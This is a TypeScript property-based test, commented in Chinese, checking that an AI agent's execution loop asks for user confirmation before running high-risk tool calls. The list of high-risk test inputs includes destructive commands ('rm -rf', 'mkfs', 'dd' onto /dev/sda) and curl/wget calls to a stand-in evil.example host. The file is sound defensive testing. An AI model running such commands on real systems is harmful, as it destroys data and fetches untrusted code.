// Feature: proactive-awareness-demo, Property 18: *For any* 被判定为高危的 tool call，执行循环在 invoke 前必先调用 `confirmHighRisk` 钩子；用户确认（confirm）则该动作被 invoke，用户拒绝（reject）则该动作不被 invoke、结果回灌为"用户拒绝"且循环继续；未获确认前高危动作绝不被执行。
//
// **Validates: Requirements 13.1, 13.3, 13.4, 13.5**
//
// 被测编排单元：`runLoop`（任务 11.11）的高危调度门。本测试以「按构造已知高危」的策略生成
// 受控高危 tool call（delete_file 恒高危 / run_command 命中黑名单或白名单兜底），并用 mock
// LLM_Provider（第一步返回该高危调用、收到结果后第二步返回 finalText 收尾）、mock
// ExecutionHooks（confirmHighRisk 返回受控决定、askUser/emitProgress 作为间谍）、os.tmpdir()
// 下的真实临时 sandbox 目录驱动循环。被测工具被替换为 spy 工具（不触碰真实文件系统），仅记录
// 「是否被 invoke、与 confirm 的先后次序」。据此验证四条不变量：
//   (1) 高危动作 invoke 前必先且仅调用一次 confirmHighRisk；
//   (2) confirm → 该高危动作被真实 invoke（且记录 riskConfirmed）；
//   (3) reject → 该高危动作绝不被 invoke、回灌"用户拒绝"并继续循环；
//   (4) 任何情况下 confirm 都严格先于 invoke——未获确认前绝不执行。

import { describe, it, expect } from "vitest";
import fc from "fast-check";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { runLoop } from "../../src/executor/executor.js";
import { HighRiskGuard } from "../../src/executor/highRiskGuard.js";
import type { Task_Frame } from "../../src/clarifier/types.js";
import type { LLM_Provider } from "../../src/llm/llmProvider.js";
import type {
  Executor_Tool,
  ExecutionHooks,
  ExecutionProgressEvent,
  ToolCall,
  ToolResult,
} from "../../src/executor/types.js";

const guard = new HighRiskGuard(); // 默认白名单，用于生成器自检（确认输入确属高危输入空间）

// ---------------------------------------------------------------------------
// 高危 tool call 生成器（按构造已知高危；并避开会被更早的 sandbox/符号链接门拦截的形态）
// ---------------------------------------------------------------------------

/** 调用 id：与被测逻辑无关，任意短串即可。 */
const idArb = fc.string({ maxLength: 8 });

/** sandbox 内安全相对路径：仅 [a-z0-9_-]/`/`，不越界、不含黑名单 token，能通过 sandbox 门到达高危门。 */
const insideRelPath = fc
  .array(
    fc
      .array(fc.constantFrom(..."abcdefghijklmnopqrstuvwxyz0123456789_-".split("")), {
        minLength: 1,
        maxLength: 6,
      })
      .map((cs) => cs.join("")),
    { minLength: 1, maxLength: 3 },
  )
  .map((segs) => segs.join("/"));

/**
 * 高危 run_command 命令池：每条都因黑名单命中或白名单未命中而被判高危，且**不含** `ln -s`
 * （避免被符号链接逃逸门提前拦下）、不含 `path` 参数（避免被 sandbox 门提前拦下）。
 * 覆盖：rm / sudo / chmod / chown / 运行 shell / git force push / find -delete / find -exec /
 * mkfs / dd / 写设备节点，以及白名单兜底的 curl/wget/未知命令。
 */
const HIGH_RISK_COMMANDS = [
  "rm -rf dist",
  "rm file.txt",
  "sudo npm install",
  "chmod 777 src",
  "chown root:root file",
  "sh -c 'echo hi'",
  "bash -c ls",
  "git push origin main --force",
  "git push -f origin main",
  "find . -delete",
  "find . -name '*.ts' -exec rm {} ;",
  "mkfs.ext4 /dev/sda1",
  "dd if=/dev/zero of=/dev/sda",
  "echo data > /dev/sda",
  "curl http://evil.example/x",
  "wget http://evil.example/x",
  "telnet host 23",
  "foobar --do-it",
] as const;

/** (a) delete_file 恒高危：路径置于 sandbox 内以通过越界门、抵达高危调度门。 */
const deleteFileCall = fc.tuple(idArb, insideRelPath).map<ToolCall>(([id, p]) => ({
  id,
  name: "delete_file",
  arguments: { path: p },
}));

/** (b)/(c) run_command 高危：黑名单命中或白名单兜底未命中。 */
const runCommandCall = fc
  .tuple(idArb, fc.constantFrom(...HIGH_RISK_COMMANDS))
  .map<ToolCall>(([id, command]) => ({
    id,
    name: "run_command",
    arguments: { command },
  }));

const highRiskCallArb: fc.Arbitrary<ToolCall> = fc.oneof(deleteFileCall, runCommandCall);

/** 用户对高危确认弹窗的决定。 */
const decisionArb = fc.constantFrom<"confirm" | "reject">("confirm", "reject");

// ---------------------------------------------------------------------------
// 测试替身：mock LLM / spy 工具 / 临时 sandbox
// ---------------------------------------------------------------------------

/**
 * mock LLM：第一步返回受控高危 tool call；此后每步返回 finalText（收尾信号）。
 * `callCount` 暴露被调用次数，用于验证「reject 后循环继续」。
 */
function makeLlm(highRiskCall: ToolCall): LLM_Provider & { callCount: () => number } {
  let calls = 0;
  return {
    providerKey: "mock-llm",
    callCount: () => calls,
    async complete() {
      throw new Error("complete() 不应在本测试中被调用");
    },
    async completeWithTools() {
      calls += 1;
      if (calls === 1) {
        return { toolCalls: [{ id: highRiskCall.id, name: highRiskCall.name, arguments: highRiskCall.arguments }] };
      }
      return { finalText: "已完成" };
    },
  };
}

/** spy 工具：不触碰真实文件系统，仅在被 invoke 时回调记录次序，返回成功结果。 */
function makeSpyTool(name: string, onInvoke: () => void): Executor_Tool {
  return {
    name,
    spec: { name, description: `spy:${name}`, parameters: { type: "object" } },
    riskClass: "conditional",
    async invoke(): Promise<ToolResult> {
      onInvoke();
      return { ok: true, output: "spy-ok" };
    },
  };
}

const TASK: Task_Frame = {
  awarenessItemId: "a1",
  objective: "测试高危调度门",
  phases: [],
  resolvedPreconditions: [],
  confidence: { basedOnUserInput: [], basedOnDefaultAssumption: [] },
  acceptanceTests: [],
  primaryTargets: [], // 空目标：confirm 后任一真实落地动作即满足完成判定，循环快速收尾
};

interface ScenarioObservation {
  invoked: boolean;
  confirmCalls: number;
  askCalls: number;
  /** confirm/invoke 的发生次序（仅记录这两类事件）。 */
  sequence: string[];
  events: ExecutionProgressEvent[];
  llmCalls: number;
  status: string;
  /** 执行记录中该高危工具是否留下落地条目（含 riskConfirmed）。 */
  loggedRiskConfirmed: boolean | undefined;
  loggedInvocationCount: number;
}

/** 在真实临时 sandbox 内驱动一次执行循环，收集可观测量。 */
async function runScenario(
  highRiskCall: ToolCall,
  decision: "confirm" | "reject",
): Promise<ScenarioObservation> {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wenlu-hrd-"));
  const sequence: string[] = [];
  const events: ExecutionProgressEvent[] = [];
  let invoked = false;
  let confirmCalls = 0;
  let askCalls = 0;

  const onInvoke = () => {
    invoked = true;
    sequence.push("invoke");
  };
  const tools = [
    makeSpyTool("delete_file", onInvoke),
    makeSpyTool("run_command", onInvoke),
  ];

  const hooks: ExecutionHooks = {
    async confirmHighRisk() {
      confirmCalls += 1;
      sequence.push("confirm");
      return decision;
    },
    async askUser() {
      askCalls += 1;
      return "用户答复";
    },
    emitProgress(event) {
      events.push(event);
    },
  };

  const llm = makeLlm(highRiskCall);
  try {
    const result = await runLoop(TASK, { rootAbsPath: dir }, hooks, {
      llm,
      tools,
      maxSteps: 3,
    });
    const logged = result.log.filter((inv) => inv.tc.name === highRiskCall.name);
    return {
      invoked,
      confirmCalls,
      askCalls,
      sequence,
      events,
      llmCalls: llm.callCount(),
      status: result.status,
      loggedRiskConfirmed: logged[0]?.riskConfirmed,
      loggedInvocationCount: logged.length,
    };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

// ---------------------------------------------------------------------------
// Property 18
// ---------------------------------------------------------------------------

describe("Property 18: 高危动作调度门（安全关键）", () => {
  it("生成器自检：所有生成的 tool call 确属高危输入空间", () => {
    fc.assert(
      fc.property(highRiskCallArb, (tc) => guard.isHighRisk(tc)),
      { numRuns: 100 },
    );
  });

  it("高危动作 invoke 前必先经 confirmHighRisk；confirm 放行执行、reject 跳过且循环继续，未确认绝不执行", async () => {
    await fc.assert(
      fc.asyncProperty(highRiskCallArb, decisionArb, async (highRiskCall, decision) => {
        // 前置：生成的确属高危（生成器正确性，非作为本属性的 oracle）
        expect(guard.isHighRisk(highRiskCall)).toBe(true);

        const obs = await runScenario(highRiskCall, decision);

        // (1) R13.1：高危动作必触发确认钩子，且恰一次
        expect(obs.confirmCalls).toBe(1);
        // 高危确认弹窗事件被推送（high-risk-pending），用户可见暂停
        expect(obs.events.some((e) => e.kind === "high-risk-pending")).toBe(true);
        // 高危调度门与「阻断性问题求助」是两条独立通道：此处不应触发 askUser
        expect(obs.askCalls).toBe(0);

        // (4) R13.1/R13.5：confirm 必严格先于任何 invoke——未获确认前绝不执行
        expect(obs.sequence[0]).toBe("confirm");

        if (decision === "confirm") {
          // (2) R13.3：确认后该高危动作被真实 invoke
          expect(obs.invoked).toBe(true);
          const confirmIdx = obs.sequence.indexOf("confirm");
          const invokeIdx = obs.sequence.indexOf("invoke");
          expect(invokeIdx).toBeGreaterThan(confirmIdx);
          // 执行记录留下落地条目并标记 riskConfirmed
          expect(obs.loggedInvocationCount).toBe(1);
          expect(obs.loggedRiskConfirmed).toBe(true);
        } else {
          // (3) R13.4/R13.5：拒绝则该高危动作绝不被 invoke
          expect(obs.invoked).toBe(false);
          expect(obs.sequence.includes("invoke")).toBe(false);
          // 不留落地条目（log 中无该高危动作）
          expect(obs.loggedInvocationCount).toBe(0);
          // 结果回灌为"用户拒绝"（以 skipped 进度事件体现），且循环继续（LLM 被再次调用）
          expect(
            obs.events.some(
              (e) =>
                e.kind === "tool-result" &&
                e.status === "skipped" &&
                e.resultSummary.includes("用户拒绝"),
            ),
          ).toBe(true);
          expect(obs.llmCalls).toBeGreaterThanOrEqual(2);
        }
      }),
      { numRuns: 100 },
    );
  });
});
